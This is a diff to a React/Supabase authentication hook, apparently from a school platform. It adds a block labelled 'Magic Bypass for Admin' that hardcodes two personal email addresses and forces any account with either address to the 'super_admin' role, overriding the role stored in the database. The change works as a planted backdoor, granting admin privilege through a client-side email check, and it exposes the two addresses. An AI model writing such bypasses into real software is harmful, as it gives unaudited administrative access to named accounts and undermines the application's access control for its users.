@@ -39,19 +39,27 @@ export const useAuth = () => {
         .eq('id', userId)
         .single()
 
+      // Magic Bypass for Admin
+      const ADMIN_EMAILS = ['henceruindungan@gmail.com', 'jeniferlumoindong68@guru.smp.belajar.id'];
+      
       if (error || !data) {
         console.warn('Profile not found, using auth metadata fallback');
         const { data: { user } } = await supabase.auth.getUser();
         if (user) {
+          const isMagicAdmin = ADMIN_EMAILS.includes(user.email || '');
           setProfile({
             id: user.id,
             full_name: user.user_metadata.full_name || user.user_metadata.name || 'User',
             email: user.email || '',
-            role: (user.user_metadata.role as any) || 'student',
+            role: isMagicAdmin ? 'super_admin' : (user.user_metadata.role as any || 'student'),
             status: 'active'
           } as Profile);
         }
       } else {
+        const isMagicAdmin = ADMIN_EMAILS.includes(data.email || '');
+        if (isMagicAdmin && data.role !== 'super_admin') {
+           data.role = 'super_admin';
+        }
         setProfile(data as Profile);
       }
     } catch (err) {
